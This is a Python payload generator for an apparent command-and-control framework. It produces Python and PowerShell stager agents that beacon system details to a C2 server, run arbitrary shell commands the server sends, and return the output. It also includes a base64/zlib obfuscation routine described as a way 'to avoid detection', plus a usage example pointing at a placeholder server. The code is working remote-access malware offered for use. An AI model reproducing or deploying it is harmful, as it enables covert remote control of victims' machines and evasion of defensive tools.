#!/usr/bin/env python3
import base64
import zlib
import random
import string

class PayloadGenerator:
    def __init__(self):
        self.templates = {
            'python': self.python_template,
            'powershell': self.powershell_template,
            'executable': self.exe_template
        }
    
    def generate(self, payload_type, config):
        """Generate payload of specified type"""
        if payload_type not in self.templates:
            raise ValueError(f"Unsupported payload type: {payload_type}")
        
        template = self.templates[payload_type]
        return template(config)
    
    def python_template(self, config):
        """Generate Python stager"""
        c2_url = config.get('c2_url', 'http://localhost:8080')
        sleep_interval = config.get('sleep_interval', 60)
        
        template = f'''
import requests
import time
import platform
import getpass
import subprocess
import os
import json

class Agent:
    def __init__(self):
        self.c2_url = "{c2_url}"
        self.agent_id = self.generate_id()
        self.sleep_interval = {sleep_interval}
        self.session = requests.Session()
    
    def generate_id(self):
        import hashlib
        hostname = platform.node()
        username = getpass.getuser()
        unique = f"{{hostname}}_{{username}}_{{os.urandom(8).hex()}}"
        return hashlib.md5(unique.encode()).hexdigest()[:16]
    
    def get_system_info(self):
        return {{
            'hostname': platform.node(),
            'username': getpass.getuser(),
            'architecture': platform.architecture()[0],
            'os': platform.platform(),
            'process': os.path.basename(__file__)
        }}
    
    def beacon(self):
        try:
            data = {{
                'agent_id': self.agent_id,
                'system_info': self.get_system_info()
            }}
            response = self.session.post(f"{{self.c2_url}}/beacon", json=data, timeout=30)
            return response.json().get('jobs', []) if response.status_code == 200 else []
        except:
            return []
    
    def execute_job(self, job):
        job_id = job.get('job_id')
        module = job.get('module_name')
        args = job.get('arguments', {{}})
        
        try:
            if module == 'shell':
                cmd = args.get('command', '')
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                output = result.decode('utf-8', errors='ignore')
            else:
                output = f"Unknown module: {{module}}"
            
            self.send_result(job_id, output, True)
        except Exception as e:
            self.send_result(job_id, f"Error: {{str(e)}}", False)
    
    def send_result(self, job_id, output, success):
        data = {{
            'agent_id': self.agent_id,
            'job_id': job_id,
            'output': output,
            'success': success
        }}
        try:
            self.session.post(f"{{self.c2_url}}/result", json=data, timeout=30)
        except:
            pass
    
    def run(self):
        print(f"[+] Agent {{self.agent_id}} started")
        while True:
            jobs = self.beacon()
            for job in jobs:
                self.execute_job(job)
            time.sleep(self.sleep_interval)

if __name__ == "__main__":
    agent = Agent()
    agent.run()
'''
        
        return template
    
    def powershell_template(self, config):
        """Generate PowerShell stager"""
        c2_url = config.get('c2_url', 'http://localhost:8080')
        
        template = f'''
$C2Server = "{c2_url}"
$AgentID = (Get-WmiObject Win32_ComputerSystemProduct).UUID
if (-not $AgentID) {{ $AgentID = [System.Guid]::NewGuid().ToString() }}

function Get-SystemInfo {{
    return @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = $env:USERDOMAIN
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    }}
}}

function Send-Beacon {{
    $body = @{{
        agent_id = $AgentID
        system_info = Get-SystemInfo
    }} | ConvertTo-Json
    
    try {{
        $response = Invoke-RestMethod -Uri "$C2Server/beacon" -Method Post -Body $body -ContentType "application/json"
        return $response.jobs
    }} catch {{
        return @()
    }}
}}

function Execute-Job {{
    param($Job)
    
    $jobId = $Job.job_id
    $module = $Job.module_name
    $args = $Job.arguments
    
    try {{
        if ($module -eq "shell") {{
            $output = Invoke-Expression $args.command 2>&1 | Out-String
        }} else {{
            $output = "Unknown module: $module"
        }}
        
        Send-Result $jobId $output $true
    }} catch {{
        Send-Result $jobId $_.Exception.Message $false
    }}
}}

function Send-Result {{
    param($JobId, $Output, $Success)
    
    $body = @{{
        agent_id = $AgentID
        job_id = $JobId
        output = $Output
        success = $Success
    }} | ConvertTo-Json
    
    try {{
        Invoke-RestMethod -Uri "$C2Server/result" -Method Post -Body $body -ContentType "application/json" | Out-Null
    }} catch {{}}
}}

# Main loop
while ($true) {{
    $jobs = Send-Beacon
    foreach ($job in $jobs) {{
        Execute-Job $job
    }}
    Start-Sleep -Seconds 60
}}
'''
        
        return template
    
    def obfuscate_payload(self, payload, method='base64'):
        """Obfuscate payload to avoid detection"""
        if method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'compress':
            compressed = zlib.compress(payload.encode())
            return base64.b64encode(compressed).decode()
        else:
            return payload
    
    def save_payload(self, payload, filename):
        """Save payload to file"""
        with open(filename, 'w') as f:
            f.write(payload)
        print(f"[+] Payload saved to: {filename}")

# Usage example
if __name__ == "__main__":
    generator = PayloadGenerator()
    
    # Generate Python payload
    python_payload = generator.generate('python', {
        'c2_url': 'http://your-server.com:8080',
        'sleep_interval': 60
    })
    
    generator.save_payload(python_payload, 'payload.py')
    
    # Generate obfuscated payload
    obfuscated = generator.obfuscate_payload(python_payload, 'base64')
    print(f"Obfuscated payload (first 100 chars): {obfuscated[:100]}...")